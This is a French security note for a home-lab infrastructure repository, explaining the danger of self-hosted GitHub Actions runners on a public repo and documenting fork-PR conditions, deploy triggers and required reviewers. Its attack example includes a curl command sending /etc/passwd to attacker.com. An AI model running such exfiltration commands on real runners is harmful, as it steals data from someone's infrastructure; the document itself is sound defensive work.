# Sécurité - Self-Hosted Runners avec Repository Public

**Date** : 2026-01-09
**Contexte** : Repository public + Self-hosted runner

---

## 🔒 Problématique

L'utilisation de **self-hosted runners** dans un **repository public** présente un risque de sécurité :

### Le Risque

1. N'importe qui peut **forker** le repository public
2. N'importe qui peut créer une **Pull Request** depuis son fork
3. Sans protection, les workflows GitHub Actions s'exécuteraient sur le **self-hosted runner**
4. Le runner a accès à l'infrastructure locale (Proxmox, containers LXC, réseau 192.168.1.x)
5. = **Code malveillant potentiellement exécuté sur votre infrastructure** 🚨

### Exemple d'Attaque

Un attaquant pourrait :
- Forker le repository
- Modifier `.github/workflows/terraform-validate.yml` pour ajouter : `curl https://attacker.com/steal?data=$(cat /etc/passwd)`
- Créer une PR
- Le workflow s'exécute sur votre runner
- L'attaquant récupère des données de votre infrastructure

---

## ✅ Protections Implémentées

### Protection 1 : Condition sur les Workflows

**Tous les workflows de validation** ont une condition qui empêche l'exécution sur les PRs de forks :

```yaml
jobs:
  job-name:
    runs-on: self-hosted
    # Security: Only run on PRs from the same repository (not forks)
    if: github.event.pull_request.head.repo.full_name == github.repository || github.event_name != 'pull_request'
```

**Explications** :
- `github.event.pull_request.head.repo.full_name` = le repository source de la PR
- `github.repository` = le repository cible (HibOOps/infra-oldevops)
- La condition est vraie uniquement si :
  - C'est une PR du **même repository** (branche interne, pas un fork)
  - OU ce n'est **pas une PR** (push direct, workflow_dispatch)

**Workflows protégés** :
- ✅ `.github/workflows/terraform-validate.yml`
- ✅ `.github/workflows/ansible-lint.yml`
- ✅ `.github/workflows/security-scan.yml`

### Protection 2 : Workflow de Déploiement Sécurisé

Le workflow **`deploy-infra.yml`** ne se déclenche **jamais** sur les PRs :

```yaml
on:
  push:
    branches:
      - master      # Seulement les pushs directs sur master
  workflow_dispatch: # Seulement les déclenchements manuels
```

**Sécurité** :
- ❌ **Pas de trigger `pull_request`** = impossible pour une PR de fork de le déclencher
- ✅ Seulement les **maintainers** peuvent push sur master
- ✅ Seulement les **maintainers** peuvent déclencher manuellement

### Protection 3 : GitHub Environment avec Required Reviewers

L'environment `production` est configuré avec :
- ✅ **Required reviewers** : Approbation manuelle obligatoire
- ✅ **Deployment branches** : Seulement `master`

**Même si** un attaquant réussit à déclencher le workflow (ce qui est impossible avec les protections 1 et 2), il devrait obtenir une **approbation manuelle** avant que le déploiement s'exécute.

---

## 🧪 Tests de Sécurité

### Test 1 : PR depuis un Fork (Simulation)

**Scénario** : Un utilisateur externe fork le repository et crée une PR malveillante.

**Résultat attendu** :
- ❌ Les workflows **ne s'exécutent PAS** sur le self-hosted runner
- ✅ GitHub affiche : "Some checks were skipped"
- ✅ L'infrastructure reste protégée

**Comment tester** (simulation interne) :
1. Créer une branche locale : `git checkout -b test-fork-simulation`
2. Ajouter un echo malveillant dans un workflow : `echo "SIMULATED ATTACK"`
3. Créer une PR
4. Vérifier que le workflow ne s'exécute pas (condition `if` bloque)

### Test 2 : PR Interne (Branche du Même Repository)

**Scénario** : Vous créez une branche feature et une PR interne.

**Résultat attendu** :
- ✅ Les workflows **s'exécutent normalement**
- ✅ Validation Terraform, Ansible, Security passent
- ✅ Pas de problème de sécurité (code de confiance)

### Test 3 : Push Direct vers Master

**Scénario** : Merge d'une PR vers master.

**Résultat attendu** :
- ✅ Le workflow `deploy-infra.yml` se déclenche
- ⏸️ Attente d'approbation manuelle (environment production)
- ✅ Après approbation, déploiement s'exécute

---

## 📋 Checklist de Sécurité

Avant de rendre le repository public, vérifier :

- [x] **Tous les workflows de validation** ont la condition `if` de sécurité
- [x] **Workflow de déploiement** ne se déclenche jamais sur `pull_request`
- [x] **Environment production** configuré avec Required reviewers
- [x] **Secrets GitHub** sont bien dans GitHub Secrets (jamais dans le code)
- [x] **`.gitignore`** ignore tous les fichiers sensibles (.vault_pass, .terraform/, *.tfstate)
- [x] **Documentation** de sécurité créée (ce fichier)

---

## ⚠️ Ce Qui Reste Exposé (Normal)

Même avec un repository public, ces éléments sont **exposés** mais **pas sensibles** :

### Code Infrastructure

✅ **Exposé** :
- Configuration Terraform (IPs, hostnames, specs)
- Playbooks Ansible (rôles, configuration)
- Structure du projet

❌ **Pas un problème** :
- Le code d'infrastructure n'est pas secret
- Démontre vos compétences (portfolio)
- Les attaquants ne peuvent pas exploiter juste en lisant le code

### IPs Privées

✅ **Exposé** : 192.168.1.x (dans le code Terraform/Ansible)

❌ **Pas un problème** :
- Ce sont des IPs **privées** (LAN local)
- Pas accessibles depuis Internet
- Même connaître les IPs ne donne pas accès

### Noms de Domaine

✅ **Exposé** : oldevops.fr et sous-domaines

❌ **Pas un problème** :
- Les domaines sont déjà publics (DNS)
- Pas de secret ici

---

## 🚫 Ce Qui N'Est JAMAIS Exposé

Ces éléments sont **toujours secrets** même avec repository public :

### Secrets GitHub

✅ **Protégés** (jamais exposés, même dans logs) :
- `OVH_S3_ACCESS_KEY` / `OVH_S3_SECRET_KEY`
- `PROXMOX_PASSWORD` / `PROXMOX_USERNAME`
- `CONTAINER_PASSWORD`
- `ANSIBLE_VAULT_PASSWORD`

### Fichiers Sensibles

✅ **Protégés** (dans `.gitignore`) :
- `.vault_pass` - Mot de passe Ansible Vault
- `.terraform/` - État local Terraform
- `*.tfstate` - État Terraform
- Clés SSH privées

### Contenu du Vault Ansible

✅ **Protégé** (chiffré) :
- `ansible/vault/secrets.yml` - Chiffré avec Ansible Vault
- Même si exposé, impossible à lire sans le mot de passe

---

## 📚 Références

- [GitHub Docs - Self-hosted runners security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security)
- [GitHub Docs - Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [GitHub Docs - Using environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)

---

## 🔄 Maintenance

### Quand Ajouter un Nouveau Workflow

Si vous créez un nouveau workflow qui utilise `runs-on: self-hosted`, **toujours** ajouter la protection :

```yaml
jobs:
  mon-job:
    runs-on: self-hosted
    # Security: Only run on PRs from the same repository (not forks)
    if: github.event.pull_request.head.repo.full_name == github.repository || github.event_name != 'pull_request'
```

### Vérification Régulière

**Mensuelle** : Vérifier que tous les workflows ont la protection
**Avant chaque PR externe** : Double-vérifier les workflows modifiés

---

**Dernière mise à jour** : 2026-01-09
**Responsable** : Olivier
**Révision** : Annuelle ou après incident de sécurité
